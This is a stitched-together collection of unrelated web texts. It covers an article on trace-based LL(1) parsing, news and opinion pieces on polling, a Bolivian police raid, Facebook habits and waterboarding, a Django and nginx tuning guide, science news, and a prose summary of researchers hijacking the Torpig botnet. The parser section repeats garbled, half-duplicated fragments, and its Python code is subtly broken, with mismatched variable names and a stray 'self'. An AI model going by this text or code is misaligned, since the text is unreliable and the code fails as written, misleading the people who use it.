Trace2( TG2 ) = ( G2,0 ) → A → ( A , 1 ) → R → ( R , 2 ) → B → [ ( B , 3 ) , ( B , 4 ) ] → B → [ ( B , 5 ) , ( B , 6 ) ] → D → ( D , 6 ) → ( None , ‘-‘)
Our intended tracer would step through Trace ( TG1 ) and Trace ( TG2 ) at the same time .
This makes the tracer is implicitly parallel !
The actual state sets of the NFA are hidden from client objects that use the tracer .
All they consume is the sequence of labels / symbols :
G2 → A → R → B → B → ( C , D ) → None
We assume now that the tracer is an object that stores the current state - set of the NFA as a private member and enables tracing though the NFA using a select method which returns a set of labels that can be used for the next select call ( unless the label is None ) .
A sequence of selectcalls looks like this :
[ A ] = tracer.select ( G2 ) [ R ] = tracer.select ( A ) [ B ] = tracer.select ( R ) [ B ] = tracer.select ( B ) [ C,D ] = tracer.select ( B ) [ None ] = tracer.select ( C ) # or [ None ] = tracer.select ( D )
Now we just have to bring the NFA tracers and the parse trees together .
If the nested list [ G2 , A , [ R , B , B , C ] ] represents a parse tree one has to step through the list and call the select method of the tracer with the current symbol found in the list .
If we enter a sublist we spawn a new tracer a call the validator recursively .
The parse tree is correct if each selection was successful .
Otherwise an exception is raised .
The following Python function gives us an implementation :
def validate_parse_tree ( tree , tracer ) : selection = [ ] for N in tree : if istree ( N ) : validate_parse_tree ( N , tracer .
clone ( ) ) else : selection = tracer .
select ( N ) if not selection : raise ValueError ( " parse tree validation failed at node %s " %N ) if None in selection : return else : raise ValueError ( " parse tree validation failed at node %s " % tree )
A conflict free traced based LL ( 1 ) parser
LL ( 1 ) parsers are a class of efficient top down parsers .
Wikipedia states
An LL parser is called an LL ( k ) parser if it uses k tokens of lookahead when parsing a sentence .
If such a parser exists for a certain grammar and it can parse sentences of this grammar without backtracking then it is called an LL ( k ) grammar .
Of these grammars , LL ( 1 ) grammars , although fairly restrictive , are very popular because the corresponding LL parsers only need to look at the next token to make their parsing decisions .
Languages based on grammars with a high value of k require considerable effort to parse .
Notice that this section is pretty confusing because the fact that only 1 token of lookahead is required for a parser does n’t imply anything about the characteristic features of the grammar but about the implementation technique .
Backtracking is mentioned as such a technique and it is a general goal of parser generator design to avoid it because backtracking has an O ( 2 ^n ) asymptotic complexity .
Later in the article WP mentions three types of LL ( 1 ) conflicts :
First / First conflict – overlapping of non-terminals
First / Follow conflict – first and follow sets overlap
Left recursion
The implicit parallelism of trace based parsers is able to solve many of the mentioned First / First and First / Follow conflicts .
TBPs are nevertheless LL ( 1 ) which means that they do n’t look deep into the token stream for decision making or run into backtracking .
Right now it is unknown how powerful TBPs actually are .
So if you know a computing science PhD student who looks for an interesting challenge in parsing theory you can recommend this work .
If the problems discussed here are already solved you can recommend that work to me .
For the rest of the article we want to assume that LL ( 1 ) grammars are EBNF grammars free of the conflicts mentioned above .
Traditionally LL( 1 ) parsers are constrained by their ability to parse language of those grammars .
Reachables
The more common term found in the literature for reachable is first set .
I prefer the term reachable in the context of EE though simply because the common distinction between first set and follow set is not so important in Trail .
We watch parsers through the lens of Trail NFAs and everything that is on the RHS of a state is just a follow set .
So the first set is also a follow set .
We give an explanation of the term reachable in the context of Trail NFAs .
Let ’s reconsider the grammar G2 which defines two grammar rules named as G2 and R .
The follow sets of the initial state of R and G2 are given by :
( G2 , 0 ) : ( A , 1 ) ( R , 2 ) : ( B , 3 ) , ( B , 4 )
The terminals or non-terminals according to those states are reachable i.e .
A is reachable from G2 and B is reachable from R. Actually we do not only look at the immediate follow sets of the initial state but also compute the transitive closure .
Reachability is transitive which means : if X is reachable from B and B is reachable from R then X is also reachable from R .
Each token in a token stream that is passed to a parser is characterized by a terminal symbol .
We call this terminal symbol also the token type .
The central idea of an LL parsers is to derive terminals ( token types )
T as leftmost derivations of nonterminals N. Leftmost derivation is yet another characterization of reachability in the above sense .
So we start with a terminal N and if T can be reached from N we can also create a parse tree containing N as a root node and T as a leaf node .
We want to elaborate this now :
Suppose T 0 is reachable from N and there is no other non-terminal M that is reachable from N which can also reach T 0 .
So there is no non-terminal between N and T 0 .
If N 0 is a start symbol of our grammar and N 1 is reachable from N 0 and N 2 from N 1 etc. we get a nested chain of symbols [ N 0 , [ N 1 , [… [ N k , … [ N , T 0 ] ] ] which is our initial parse tree .
That was simple but how to move on and derive the next token T 1 ?
Let ’s examine the Trail NFA of N which has following structure :
( N , 0 ) : ( T0 , 1 ) , ... ( T0 , 1 ) : ( M , 2 ) , ... ...
and make following case distinction :
( T 1 , i ) is a follow state of ( T 0 , 1 ) .
Then our new parse tree becomes [ N 0 , [ N 1 , [… [ N k , … [ N , T 0 , T 1 *] ] ] and we can proceed with token T 2 and the follow states of ( T 1 , i ) in N .
The * symbol indicates the location where the parser proceeds .
These locations correspond to NFA states .
, i ) is a follow state of ( T , 1 ) .
Then our new parse tree becomes [ N [ N [ … [ N … [ N , T , * ] ] ] and we can proceed with token T and the follow states of ( T , i ) in N .
The * symbol indicates the location where the parser proceeds .
These locations correspond to NFA states .
( T 1 , i ) is reachable from ( M , 2 ) .
Then we recursively call the parser with the token iterator and M as a start symbol and trace through the NFA of M .
The parser returns a new parse tree [ M , … ] and we embed this tree like [ N 0 , [ N 1 , [… [ N k , … [ N , T 0 , [ M , … ] *] ] ] and proceed with the follow states of ( M , 2 ) and the current token T k yielded by the token iterator .
, i ) is reachable from ( M , 2 ) .
Then we recursively call the parser with the token iterator and M as a start symbol and trace through the NFA of M .
The parser returns a new parse tree [ M , … ] and we embed this tree like [ N [ N [ … [ N … [ N , T , * ] ] ] and proceed with the follow states of ( M , 2 ) and the current token T yielded by the token iterator .
( None , ‘-‘) is in the follow states of ( T 0 , 1 ) .
This means that that N is allowed to terminate .
The parser with N as a start symbol returns the parse tree [ N , T 0 ] .
So we get [ N 0 , [ N 1 , [… [ N k , … [ N , T 0 ] * ] ] and proceed with T1 and N k .
, 1 ) .
This means that that N is allowed to terminate .
The parser with N as a start symbol returns the parse tree [ N , T ] .
So we get [ N [ N [ … [ N … * ] ] and proceed with T1 and N .
If all those conditions fail raise an error message .
The following code is an implementation of the algorithm .
def parse ( tokenstream , symbol ) : tracer = self .
new_tracer ( symbol ) selection = tracer .
select ( symbol ) tree = [ symbol ] token = tokenstream .
current ( ) while token : token_type = get_tokentype ( token ) for nid in selection : if nid is not None : if istoken ( nid ) : if token_type == nid : tokenstream .
shift_read_position ( ) tree. append ( token ) break elif token_type in reachable ( nid ) : sub = parse ( tokenstream , nid ) if sub : tree .
append ( sub ) break else : continue else : if None in selection : return tree else : raise ParserError selection = tracer .
select ( nid ) try : token = tokstream .
next ( ) except StopIteration : token =
None return tree
You will have noticed that the production of the NFAs from EBNF grammars was just presumed .
It would take another article to describe the translation .
However for simple grammars you can do such a translation easily by hand and the translation process does n’t add much to our understanding of parse tree validation and language parsing .
What ’s next ?
In the next article we will touch grammars with First / First and First / Follow conflicts .
They are not LL ( 1 ) grammars according to the Wikipedia definition .
The way we ’ve dealt with those grammars is neither increasing the number of lookaheads ( i.e. going from LL ( 1 ) to LL ( k ) or LL ( * ) ) , nor running into backtracking , nor modifying the grammar itself .
Instead we carefully modify the NFAs derived from the grammar .
“ Careful ” means that parse trees we create with TBP and modified NFAs correspond to those created with unmodified NFAs .
That ’s much like distort and restore the grammar itself .
This might be another area of academic research for young computing scientists interested in parser technology .
I ’ve developed a particular algorithm for solving the mentioned problem and I have n’t the slightest idea if one could do so far better .
Notice that I even tried to attack left recursion conflicts that tantalize top down parsers but I gave up on these approaches because I could n’t understand the NFAs anymore , did n’t capture all use cases and debugging became such a pain .
However there is still the promise of creating an O ( n ) top down parser that is able to parse all context free languages .
And please , no tricks and no PEGs .
Sweeping grammar conflicts under the rug using ordered choice is a foul and a burden to the programmer who wants to use the parser generator .
Creating such a parser is n’t quite proving P!=NP but it would be still really , really cool and of much more practical relevance .
Public opinion polling is a maddening fact of life for anyone who follows politics .
Polls come with cross tabs , tracking numbers and margins of error .
It is also a reality that pundits can find , regardless of their views , poll numbers reflecting their particular argument .
While some polling groups are more respected than others , and some aggregators more consistent and fairer than others , it ’s difficult for any partisan to decry non -stop polling while citing one that jumps out and defends his or her views .
Specifically , Barack Obama has been in office less than the totemic 100 days , and yet we are bombarded by public approval polls almost every day .
It ’s grating and exhausting to keep up , and besides , why should we care if his approval ratings stay close to the 60 percent mark ?
There ’s a long way to go , especially regarding — but certainly not limited to — the economy .
The administration ’s approaches to the financial and auto industries as well as Wall St. have yet to hit full steam .
Yet the public is beginning to respond .
And I make no claim to poll - free writing .
Two of my recent columns reference polling , one directly , one less so .
It ’s easy to embrace or dismiss a poll , and all pundits — including this one — need to be aware of the thinness of public opinion in the short term .
The present is almost always too early a point to start discussing the future ; more often , it ’s better to look back , and in terms of President Obama ’s popularity numbers , et al , it could not be truer .
Public opinion of politicians is capricious , as anyone who has followed any campaign can tell you .
What can be of greater use , in the short terms , are polls that are n’t predicated on a single politician .
On April 7 , The New York Times went so far as publish , front and center on A1 , a poll that found a majority of the public more optimistic about the economy since Inauguration .
While focused on the President ’s approval ratings , a poll from Pew shows that more Americans know the current unemployment rate than the current Dow Jones average , and have , in general , a bare working knowledge of the economic crisis .
The breakdowns of the Pew poll are much more interesting — and , I believe , more relevant — than the day - to - day tracking of approval ratings .
Most troubling were the numbers related to age :
This gap is largest on the two questions relating to Afghanistan .
Only about half ( 52 % ) of those younger than 35 know that Pakistan and Afghanistan share a border , compared with 71 % of those 35 to 49 , and 80 % of those 50 and older .
While just 47 % of those younger than 35 know that Obama decided to increase troop levels in Afghanistan , substantial majorities of those 35 to 49 ( 69 % ) and 50 and older know this ( 79 % ) .
There also are sizable age differences in the percentages able to identify Timothy Geithner ’s position , the name of the Federal Reserve Board chairman and the U.S. automaker that has not taken emergency loans from the government .
No one poll can tell us everything we need to know about everyone else , though the attempts are imperfect and ceaseless .
Perhaps the Times splashed that big poll across its front page in a nod to the vocal group of readers who complain that the Times is all bad news all the time .
And on the other hand ( or some other hand ) , via Marc Ambinder , Americans are thinking rather sober thoughts about the economy :
But a new poll from the Center for Economic and Entrepreneurial Literacy shows , as others have suggested , that Americans expect the recession to last for a while : by far the largest chunk of respondents ( 41 percent ) said they expect the economy wo n't recover for another one to three years .
( 1,002 people were polled ; margin of error +/- three percent . )
The respondents to this poll , at least , appear to have little faith that the stimulus and the bank plan will bring the U.S. out of a recession soon .
Sometimes a puff poll is just that — and sometimes it ’s something else : a little boost of optimism .
But considering that Pew poll , not a lot of us really know what to be optimistic about — or we 're pessimistic , but just happy to have a different team at the helm .
Airlifted in from Bolivia 's western highlands , some two dozen elite officers in green helmets and flak jackets entered the Las Americas Hotel just before 4 a.m. , disabled its surveillance cameras and stealthily made for the fourth floor .
A bomb exploded .
After 15 minutes of gunfire , three men were dead in their underwear on separate hotel room floors : A Bolivian - born Hungarian , an Irishman and a Romanian .
Two of their comrades with ties to Croatia and Hungary were arrested in rooms down the hall .
A few hours later , President Evo Morales announced during a visit to Venezuela that an assassination plot against him , hatched by right - wing extremists and employing foreign mercenaries , had been foiled on his instructions .
" Before I left , " he said , " I gave the order . "
The strange events of April 16 have only deepened political and social rifts in this nation of 10 million , where Morales , an Indian and a strident leftist , faces an intransigent foe in the light - skinned elite of this provincial capital .
Vice President Alvaro Garcia has blamed the alleged plot on " the fascist and racist right " of Santa Cruz .
Morales ' opponents in turn claim the government is trying to discredit them and bolster his campaign for re-election in December .
The killings have also brought Bolivia to the attention of four European countries impatient for an explanation .
Hungary , Ireland , Romania and Croatia have all asked for what the latter called " a full and impartial " accounting .
Was it not possible to wait a few hours and capture the alleged conspirators peacefully at breakfast ?
" The Irish government has a legitimate right to seek the facts of how one of its citizens came to be killed by the security forces of another state , " said Ireland 's foreign minister , Michael Martin .
Yet more than two weeks after the raid , Bolivia has yet to provide persuasive details of the alleged conspiracy .
It 's a puzzle , in the words of Hungarian Foreign Minister Peter Balazs , in which the pieces do n't fit .
An indignant Morales at first resisted the calls for explanation .
Then , at the United Nations on April 22 , he said he was willing to accept an international investigation .
Such a probe would almost certainly begin with Eduardo Rozsa Flores , the only one of the slain men with clear warrior credentials .
In September , he told a TV journalist in Hungary that he was returning home to organize a militia .
You can only broadcast the interview , Rozsa said , if I do n't return alive .
Born in Santa Cruz 49 years ago to a Hungarian father and Bolivian mother , Rozsa boasted in interviews and in a blog of serving as a translator for " Carlos the Jackal " when the Venezuelan terrorist was living in then - communist Hungary .
After the Berlin Wall fell , Rozsa became a minor celebrity in Croatia for commanding a brigade of foreign volunteers in its 1991 independence war .
A poet , journalist and recent convert to Islam , he later starred as himself in " Chico , " a biopic that won best film in Hungary 's national cinema festival in 2002 .
The other two slain men apparently lacked Rozsa 's combat experience , if not his sense of adventure .
So under what premise _ and for what exactly _ did he recruit them ?
Michael Dwyer was a 24 - year - old Irish security guard whose family said he went to Bolivia in October looking for work .
His Facebook pages show he liked to play Airsoft , a non-lethal military game like paintball where participants shoot nonmetallic pellets at each other .
Arpad Magyarosi , 29 , was an ethnic Hungarian rock musician and schoolteacher from Romania who relatives said loved to travel .
Neither of the men apparently told their families back home exactly what they were doing in distant Bolivia .
Authorities said Las Americas was the third four - star or better hotel in which the men had lodged .
The raid 's two survivors were flown to the highlands capital of La Paz and jailed without bail on terrorism charges after a closed hearing .
They are Mario Tadic , a 51 - year - old Bolivia - Croat comrade - in-arms of Rozsa from the Balkans , and Hungarian computer technician Elod Toaso .
Bolivian Defense Minister Walker San Miguel said Rozsa recruited Toaso , 28 , through the Szekler Legion , a right - wing group that promotes autonomy for Romania 's ethnic Hungarians .
Hungary 's ambassador , Matyas Jozsa , told The Associated Press after visiting Toaso in jail that the former bank employee may not have understood what he was getting into .
" My impression is that far from being a terrorist , he 's fearful .
Little by little he came to realize what he was involved in and that he'd made a big mistake , " said Jozsa .
He believes the slain men never had a chance to surrender and said Toaso saved himself by diving face - down to the floor , putting his hands on the back of his neck .
How Tadic survived is unclear .
No relative has emerged , and a human rights lawyer who visited him said only that he was prepared to cooperate with authorities .
The hotel 's manager , Hernan Rossell , told the AP he arrived on the scene 10 minutes after the shooting ended and saw Rozsa 's body on the floor , a revolver about 40 centimeters ( 16 inches ) from his right hand , a bullet wound in his face .
It was the only weapon Rossell said he saw on the fourth floor not wielded by the police , none of whom were injured in the raid .
Julio Larrea , a police investigator , said the alleged mercenaries set off a C4 plastic explosives charge just before the shootout began .
He said police recovered guns at the scene , though he did n't specify how many or where , except that a handgun and a silencer were found in Rozsa 's room .
Authorities have offered no evidence that the slain men fired weapons .
An autopsy done on Dwyer 's badly decomposed body in Ireland determined he was killed by a single gunshot to the chest , but apparently little more .
Many aspects of the case are still a mystery .
On the day of the raid , Bolivian police confiscated about a dozen weapons at a convention center booth that they said the alleged assassins had rented through a local telecommunications company or a business fair .
Prosecutor Marcelo Sosa later showed photos he said were found at the convention center booth of all the alleged mercenaries but Tadic posing with guns .
In one , Dwyer has a pistol in each hand .
Police also said the men were responsible for a dynamite blast the day before at the home of the local Roman Catholic cardinal , in which nobody was hurt and minor damage incurred .
They presented another man , Juan Carlos Gueder , who has been arrested on terrorism charges .
Gueder told reporters he sold Rozsa a pistol , and that Rozsa said he planned to assassinate Santa Cruz 's governor , Ruben Costas , to make him " a martyr . "
Garcia , the vice president , says the alleged mercenaries were planning to kill him and Morales , then " organize civilian groups for an armed resistance to violently seize power . "
Pro-autonomy groups in Bolivia are especially upset by Morales ' plan to seize fallow cropland from big landholders , many of whom are based in Santa Cruz , and " return " it to members of Bolivia 's indigenous majority .
However , the opposition vehemently denies involvement in any assassination plot .
The evidence authorities have provided to date is a three - minute video that Sosa says was obtained from an informant .
He says it shows the three slain men lamenting missing a chance to bomb a boat on which Morales held a Cabinet meeting in Lake Titicaca in early April .
The accompanying audio is unclear , however .
Reporters who viewed it could make out words including " Titicaca , " " wetsuit " and " explosives " but no clear narrative .
Another piece of the mystery surrounds the men's stay in Bolivia .
The police investigator , Larrea , said Rozsa had taken Toasa and Tadic 's passports from them so they could n't travel .
In the Sept. 8 interview where he laid out his plan to form a militia in Bolivia , Rozsa told Hungarian television anchor Andras Kepes that he intended to sneak in through Brazil .
He said he was going not as an agitator , but as a defender .
" I have been called to organize the defense of the city and province of Santa Cruz , " he said .
" This is n't about me going to the Bolivian jungle to play Che Guevara . "
Guevara , a hero of Cuba 's revolution , was executed in Bolivia in 1967 after failing to launch a communist uprising .
Rozsa insisted his mission was not " to attack La Paz or to help organize an attack on the capital and to drive away the president . "
Kepes said the videotaped interview could be considered Rozsa 's " last will and testament . "
But more could be coming .
Bolivian authorities seized five laptops in the raid .
In the movie " Chico , " playing himself , Rozsa quotes the 19th - century Cuban independence leader and poet Jose Marti in explaining to a Croat military officer why he 's enlisting in another nation 's fight .
" It 's criminal to promote a war that can be avoided , " he says , " and it is also criminal not to support a war that is inevitable . "

The final straw came when I saw yet another gym status update .
Those of you who share my habit of obsessively checking Facebook know exactly what I 'm talking about .
You sit down to see what your friends are doing - in my case this generally happens with a cheese danish in hand - and you read that Sally is " just back from spin class and trying to decide what to make for dinner , " or that Scott " might have to skip the gym to get a haircut . "
These gym updaters are usually repeat offenders to boot .
Sally feels compelled to tell her 400 Facebook friends that she is home from spin class every day , and lately I 've noticed that Scott has upped his gym updates as well .
If I thought my friends were interesting , Facebook has taught me otherwise .
Last week I decided that I could n't take any more David " is making soup " or Denise " hopes the Celtics can pull it off " updates .
I did the unthinkable : I started hiding updates from friends who have an annoying habit of clogging my Facebook news feed with useless snippets of their lives .
I felt both guilt and tremendous satisfaction as I silenced the cyber voices that had previously screamed for my attention .
Finally , I was free from updates of youth soccer scores and the results of endless " Five people who share my birthday " or " Five people I 've been told I look like " quizzes .
Even my mother , a woman who can barely turn on a computer or send a text message , abandoned her Facebook account for the same reason .
She was sick of meaningless status updates .
As they say , the misanthrope does n't fall far from the tree .
As I hovered my mouse over that invisible " hide " button that lurks ghost - like in the corner of every Facebook status update , I wondered why people now feel compelled to share so much about so little .
Have Twitter , Facebook , and Linked In turned us into a nation of self - absorbed narcissists who think the world really wants to hear that we just drank coffee or view a mobile upload of that amazing fettuccine we had for supper ?
" I do n't think it 's entirely the fact that people are narcissistic and self - centered , although many times that 's the case , " says Patrick O'Malley , a local speaker and trainer on social networking websites .
" I think that there are just no rules on how to use these sites .
People see that their friends are putting up these inane posts on Facebook and Twitter all day , and they do the same thing .
My rule of thumb is that I 'll post five to six times a week on Facebook , just to connect with people .
My rule for Twitter is to tweet three or four times a day .
I think any more than that is just excessive . "
When used properly , I think Facebook and Twitter are fantastic tools , and I 've connected with many long - lost friends ( and avoided a few as well ) .
I 'm just as guilty as anyone of occasionally posting useless updates or goofy YouTube clips from " Match Game ' 74 , " but I try to be careful not to overpost .
When I explained my annoyance at excessive tweets and status updates to Hal Niedzviecki , Toronto - based author of the book " The Peep Diaries : How We 're Learning to Love Watching Ourselves and Our Neighbors , " he offered an entirely different perspective .
Niedzviecki , who 's currently filming a documentary about these websites , has a theory that people are not all self - absorbed , they 're just looking for human connection .
" There 's a certain charm to status updates of ' I 'm making soup . '
These things have a beauty to them because they 're little domestic details of our lives , " he says .
" Once upon a time we lived in villages and everybody knew that someone was making soup .
Now we live in isolation .
If you look at it positively , you say , ' These are ways to alleviate the loneliness and return to a more communal time . '
In certain ways you could say that these are anti-narcissistic gestures , they 're gestures of community that bring us together . "
After chatting with Niedzviecki , I felt like a cad for turning my back on my friends .
These poor folks were just trying to reach out and share their lives .
In turn , I dropped them like a moldy peach .
I contemplated adding them back into my Facebook news feed , but instead I decided to compromise .
I sent out a status update of my own : Christopher Muther " is a cad and is sorry for dropping you like a moldy peach . "

Warren Buffett on reading old newspapers :
" I would get these newspapers from 1929 .
I could n't get enough of it .
I read everything - not just the business and stock - market stories .
History is interesting , and there is something about history in a newspaper , just seeing a place , the stories , even the ads , everything .
It takes you into a different world , told by someone who was an eyewitness , and you are really living in that time . "

A lot of these steps will speed up any kind of application , not just django projects , but there are a few django specific things .
Everything has been tested on IvyLees which is running in a Debian / Ubuntu environment .
These three simple steps will speed up your server and allow it to handle more traffic .
Reducing the Number of HTTP Requests
Yahoo has developed a firefox extension called YSlow .
It analyzes all of the traffic from a website and gives a score on a few categories where improvements can be made .
It recommends reducing all of your css files into one file and all of your js files into one file or as few as possible .
There is a pluggable , open source django application available to help with that task .
After setting up django - compress , a website will have css and js files that are minified ( excess white space and characters are removed to reduce file size ) .
The application will also give the files version numbers so that they can be cached by the web browser and wo n’t need to be downloaded again until a change is made and a new version of the file is created .
How to setup the server to set a far future expiration is shown below in the lightweight server section .
Setting up Memcached
Django makes it really simple to set up caching backends and memcached is easy to install .
sudo aptitude install memcached , python - setuptools
We will need setuptools so that we can do the following command .
sudo easy_install python - memcached
Once that is done you can start the memcached server by doing the following :
sudo memcached -d -u www - data -p 11211 -m 64
-d will start it in daemon mode , -u is the user for it to run as , -p is the port , and -m is the maximum number of megabytes of memory to use .
Now open up the settings .py file for your project and add the following line :
CACHE_BACKEND = ' memcached://127.0.0.1:11211/'
Find the MIDDLEWARE_CLASSES section and add this to the beginning of the list :
' django.middleware.cache.UpdateCacheMiddleware ' ,
and this to the end of the list :
' django.middleware.cache.FetchFromCacheMiddleware ' ,
For more about caching with django see the django docs on caching .
You can reload the server now to try it out .
sudo /etc/init.d/apache2 reload
To make sure that memcached is set up correctly you can telnet into it and get some statistics .
telnet localhost 11211
Once you are in type stats and it will show some information ( press ctrl ] and then ctrl d to exit ) .
If there are too many zeroes , it either is n’t working or you have n’t visited your site since the caching was set up .
See the memcached site for more information .
Do n’t Use Apache for Static Files
Apache has some overhead involved that makes it good for serving php , python , or ruby applications , but you do not need that for static files like your images , style sheets , and javascript .
There are a few options for lightweight servers that you can put in front of apache to handle the static files .
Lighttpd ( lighty ) and nginx ( engine x ) are two good options .
Adding this layer in front of your application will act as an application firewall so there is a security bonus to the speed bonus .
There is this guide to install a django setup with nginx and apache from scratch .
If you followed my guide to set up your server or already have apache set up for your application , then there are a few steps to get nginx handling your static files .
sudo aptitude install nginx
Edit the config file for your site ( sudo nano /etc/ apache2/ sites -available / default ) and change the port from 80 to 8080 and change the ip address ( might be *) to 127.0.0.1 .
The lines will look like the following
NameVirtualHost 127.0.0.1:8080 < VirtualHost 127.0.0.1:8080 >
Also edit the ports.conf file ( sudo nano /etc/apache2/ports.conf ) so that it will listen on 8080 .
Listen 8080
Do n’t restart the server yet , you want to configure nginx first .
Edit the default nginx config file ( sudo nano / etc/nginx / sites - available / default ) and find where it says
location / { root / var/www/nginx - default ; index index.html index.htm ; }
and replace it with
location / { proxy_pass
http://192.168.0.180:8080; proxy_redirect off ; proxy_set_header
Host $ host ; proxy_set_header X - Real - IP $ remote_addr ; proxy_set_header X - Forwarded - For $ proxy_add_x_forwarded_for ; client_max_body_size 10 m ; client_body_buffer_size 128k ; proxy_connect_timeout 90 ; proxy_send_timeout 90 ; proxy_read_timeout 90 ; proxy_buffer_size 4k ; proxy_buffers 4 32 k ; proxy_busy_buffers_size 64k ; proxy_temp_file_write_size
64 k ; } location / files / { root / var / www / myproject / ; expires max ; }
/ files / is where I ’ve stored all of my static files and / var / www / myproject / is where my project lives and it contains the files directory .
Set static files to expire far in the future
expires max ; will tell your users ’ browsers to cache the files from that directory for a long time .
Only use that if you are use those files wo n’t change .
You can use expires 24h ; if you are n’t sure .
Configure gzip
Edit the nginx configuration to use gzip on all of your static files ( sudo nano /etc/nginx/nginx.conf ) .
Where it says gzip on ; make sure it looks like the following :
gzip on ; gzip_comp_level 2 ; gzip_proxied any ; gzip_types text / plain text / html text / css application / x- javascript text / xml application / xml application / xml+rss text / javascript ;
The servers should be ready to be restarted .
sudo /etc/init.d/apache2 reload sudo /etc/init.d/nginx reload
If you are having any problems I suggest reading through this guide and seeing if you have something set up differently .
Speedy Django Sites
Those three steps should speed up your server and allow for more simultaneous visitors .
There is a lot more that can be done , but getting these three easy things out of the way first is a good start .
I use webfaction to host a lot of my django projects .
It has an easy setup that will get you developing quickly and a great community of talented programmers .
There is also a quick setup for rails , wordpress , and a lot more .

Inkscape is a Free Vector graphics Editor .
It is open source , and similar capabilities as Adobe Illustrator , Corel Draw or Xara X .
Other popular image editing software ( like Paint .
Net ) store images in form of raster graphics format ( bitmap ) .
That ties the images to the resolution , and changing the resolution impacts the appearance of the images .
However , Vector graphics editors , like Illustrator and Inkscape store resolution independent description of the actual shapes and objects that you see in the image .
This makes them better to use for projects that would require images to be presented in multiple resolutions .
Inkscape is pretty good at what it does .
It is being used by amateurs as well as professionals – who do not want to shell out huge sums of money on expensive software .
Inkscape uses W3C standard SVG format ( Scalable Vector Graphics ) .
Inkscape supports advanced SVG features as well , such as markers , clones , alpha blending etc .
We really love this free software because of its ease of use , intuitive interface , and tons of features that it provides .
Inkscape works on Windows , Mac OS X , as well as Linux .

In the formation of droplets in a stream of falling sand , scientists have witnessed a dynamic that points beyond the boundaries of traditional physics , and may represent one aspect of a fifth state of matter .
“ Here we have a material right underneath our noses , that everybody grows up playing with in a sandbox , yet it ’s full of surprises for scientists , ” physicist said Heinrich Jaeger of the University of Chicago .
The droplets formed because of instabilities in the subtle atomic forces that attract sand grains to each other .
Something similar happens to water falling from a faucet , but the forces acting on those molecules are 100,000 times stronger .
Measurements of this phenomena , published Wednesday in Nature , overturn the previous explanation for sand droplets — that grains stick to each other after colliding — and quantify what ’s called an “ ultralow - surface - tension regime . ”
It ’s entirely new territory for researchers , and just one of many dynamics governing the behavior of granular materials , which for reasons unknown to science act sometimes as solids , or liquids , or gases — or something in - between .
“ You walk on the beach , and the sand supports your weight .
Pick up a handful , and it runs through your fingers , like a liquid .
But you ca n’t walk on water , ” said Jaeger .
“ In the top of an hourglass , sand is this strange solid .
It ’s at the verge of being a solid ; it flows through the middle as something like a liquid , and then it ’s a solid again , ” he said .
Since the early 1990s , Jaeger has treated granularity as both a form of matter unto itself and a model for investigating the dynamics of types of matter , as though molecules could be seen by a naked eye .
Jaeger also sees in granularity a potentially universal dynamic , reflected in everything from highway traffic to crowd patterns to ecosystem function .
“ You have many interacting particles .
Energy is put in , sometimes they get stuck , and sometimes it flows , ” said Jaeger .
“ If it flows , what properties does it have ?
With many interacting players , that behavior is typically very complex and crosses between solid - and liquid - like behavior . ”
On a less - speculative level , research into granularity could be a boon for manufacturers .
Most finished products and foods pass at some point through a granular stage — pellets of plastic , gravel in concrete , corn in a silo , powders in a pill , on and on .
A report published by the Rand Corporation in 1986 found that granular industrial processes generally function at about 60 % of capacity .
“ Semingly modest changes in conditions , such as temperature , humidity , and surface conditions routinely cause earth bound devices to fail , ” concluded the authors of a 2005 NASA technical report on the importance of understanding granularity to exploring Mars and the Moon .
The authors are scathing in their critique of industry , which in the absence of granular theory relies on “ millennia - long trial - and - error practices that lead to today ’s massive over - design , high failure rate , and extensive incremental scaling up of industrial processes because of the inadequate predictive tools for design . ”
“ Physicists have a rich toolbox for dealing with solids , liquids and gases .
But we do n’t have a manual for when the old categories do n’t apply , ” said Jaeger .

A bunch of researchers at the University of California Santa Barbara took control of a botnet for ten days , and learned a lot about how botnets work :
The botnet in question is controlled by Torpig ( also known as Sinowal ) , a malware program that aims to gather personal and financial information from Windows users .
The researchers gained control of the Torpig botnet by exploiting a weakness in the way the bots try to locate their commands and control servers — the bots would generate a list of domains that they planned to contact next , but not all of those domains were registered yet .
The researchers then registered the domains that the bots would resolve , and then set up servers where the bots could connect to find their commands .
This method lasted for a full ten days before the botnet ’s controllers updated the system and cut the observation short .
During that time , however , UCSB ’s researchers were able to gather massive amounts of information on how the botnet functions as well as what kind of information it ’s gathering .
Almost 300,000 unique login credentials were gathered over the time the researchers controlled the botnet , including 56,000 passwords gathered in a single hour using “ simple replacement rules ” and a password cracker .
They found that 28 percent of victims reused their credentials for accessing 368,501 websites , making it an easy task for scammers to gather further personal information .
The researchers noted that they were able to read through hundreds of e-mail , forum , and chat messages gathered by Torpig that “ often contain detailed ( and private ) descriptions of the lives of their authors . ”

Sean Hannity said on his radio show that you have to be a fool to oppose waterboarding , but yet Sean still has n’t followed through with his promise to be waterboarded for charity , so the only fool I see here is Sean Hannity .
Here is the audio from Media Matters :

Hannity said , “ Do they ( Obama , Pelosi , and Reid ) really believe that they are morally superior in their views to allow tens of hundreds of innocent Americans that they should die rather than waterboard for 40 seconds at a time KSM ?
Frankly only a moral fool would say that there are no circumstances where they can envision using enhanced interrogation tactics like waterboarding .
You have to be a fool . ”
Sean , a fool is someone who talks about something which they know nothing about .
A fool is someone who makes a moral argument for torture .
( This is a strategy even the Republican Party has abandoned .
Cheney and his supporters argue for torture based on its effectiveness , not morality ) .
A fool is someone who accepts a challenge on national television , but is so terrified of going through with it , that he forgets he ever said .
Sean Hannity , you are the fool here .
IN A world first that could bring hope to thousands of schizophrenics , Melbourne scientists have discovered that a form of the disease is linked to a lack of certain proteins in the brain 's lining .
The discovery that one in four schizophrenics has the defect could lead to better treatments and earlier diagnosis of the condition .
The breakthrough , by scientists from the Mental Research Health Institute in Parkville , is being compared to the discovery that type 1 and type 2 diabetes were separate diseases requiring different treatments .
" The same will now be true for schizophrenia , a syndrome that affects one in 100 people , " said Professor Brian Dean , head of a 10 - member team that has spent 15 years searching for the cause of the illness .
" Now we can study a form of schizophrenia in isolation , it makes it much easier to see what is changed in the brains of subjects .
Some historic , religious structures , like Angkor Wat in Cambodia or the pyramids in Egypt , draw hundreds of thousands of tourists each year .
Other temples , tombs and mosques , no less spectacular than their tourist - heavy peers , have been reclaimed by nature , turning from architectural marvels into man-made shells covered with trees , plants , vines , or sand .
Despite being aged and broken down , the unique hybrid of man-made elements and natural ones makes the ruins below as spectacular as when they were newly constructed .
Beng Mealea , Cambodia
( image via writer 128 )
Angkor Wat , in Siem Reap , Cambodia , is one of Southeast Asia ’s biggest tourist draws .
